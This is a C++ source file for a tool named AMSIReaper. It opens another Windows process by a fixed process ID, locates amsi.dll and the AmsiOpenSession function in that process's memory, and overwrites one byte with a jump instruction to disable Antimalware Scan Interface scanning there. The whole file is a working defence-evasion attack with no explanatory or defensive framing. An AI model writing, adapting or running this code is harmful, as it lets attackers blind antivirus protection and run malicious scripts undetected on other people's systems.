#include <windows.h>
#include <iostream>
#include <psapi.h>


class AMSIReaper {
public:
    static HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
        return ::OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
    }

    static BOOL WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) {
        return ::WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
    }

    static BOOL CloseHandle(HANDLE hObject) {
        return ::CloseHandle(hObject);
    }

    static HMODULE GetRemoteModuleHandle(HANDLE hProcess, LPCSTR moduleName) {
        HMODULE hModules[1024];
        DWORD cbNeeded;
        if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded)) {
            for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); ++i) {
                char modulePath[MAX_PATH];
                if (GetModuleBaseNameA(hProcess, hModules[i], modulePath, sizeof(modulePath))) {
                    if (_stricmp(modulePath, moduleName) == 0) {
                        return hModules[i];
                    }
                }
            }
        }
        return NULL;
    }

    static FARPROC GetRemoteProcAddress(HANDLE hProcess, HMODULE hModule, LPCSTR lpProcName) {
        BYTE buffer[1024];
        if (ReadProcessMemory(hProcess, hModule, buffer, sizeof(buffer), nullptr)) {
            IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(buffer);
            IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(buffer + dosHeader->e_lfanew);

            DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            IMAGE_EXPORT_DIRECTORY exportDir;

            if (ReadProcessMemory(hProcess, (BYTE*)hModule + exportDirRVA, &exportDir, sizeof(exportDir), nullptr)) {
                DWORD* names = new DWORD[exportDir.NumberOfNames];
                ReadProcessMemory(hProcess, (BYTE*)hModule + exportDir.AddressOfNames, names, sizeof(DWORD) * exportDir.NumberOfNames, nullptr);

                for (unsigned int i = 0; i < exportDir.NumberOfNames; ++i) {
                    char functionName[256];
                    ReadProcessMemory(hProcess, (BYTE*)hModule + names[i], functionName, sizeof(functionName), nullptr);

                    if (strcmp(functionName, lpProcName) == 0) {
                        WORD ordinalIndex;
                        ReadProcessMemory(hProcess, (BYTE*)hModule + exportDir.AddressOfNameOrdinals + i * sizeof(WORD), &ordinalIndex, sizeof(WORD), nullptr);

                        DWORD functionRVA;
                        ReadProcessMemory(hProcess, (BYTE*)hModule + exportDir.AddressOfFunctions + ordinalIndex * sizeof(DWORD), &functionRVA, sizeof(DWORD), nullptr);

                        delete[] names;
                        return (FARPROC)((BYTE*)hModule + functionRVA);
                    }
                }
                delete[] names;
            }
        }
        return nullptr;
    }
};

int main() {
    DWORD processId = 9148; 
    BYTE patch = 0xEB; 

    HANDLE hProcess = AMSIReaper::OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, processId);
    if (hProcess != NULL) {
        HMODULE hAmsiDll = AMSIReaper::GetRemoteModuleHandle(hProcess, "amsi.dll");
        if (hAmsiDll != NULL) {
            FARPROC pAmsiOpenSession = AMSIReaper::GetRemoteProcAddress(hProcess, hAmsiDll, "AmsiOpenSession");
            if (pAmsiOpenSession != NULL) {
                LPVOID patchAddr = (LPVOID)((uintptr_t)pAmsiOpenSession + 3); // Adjust offset if needed
                SIZE_T bytesWritten;
                if (AMSIReaper::WriteProcessMemory(hProcess, patchAddr, &patch, sizeof(patch), &bytesWritten)) {
                    std::cout << "Memory patched successfully!" << std::endl;
                }
                else {
                    std::cerr << "Failed to patch memory. Error: " << GetLastError() << std::endl;
                }
            }
            else {
                std::cerr << "Failed to get AmsiOpenSession address." << std::endl;
            }
        }
        else {
            std::cerr << "Failed to locate amsi.dll in the target process." << std::endl;
        }
        AMSIReaper::CloseHandle(hProcess);
    }
    else {
        std::cerr << "Failed to open target process. Error: " << GetLastError() << std::endl;
    }

    return 0;
}
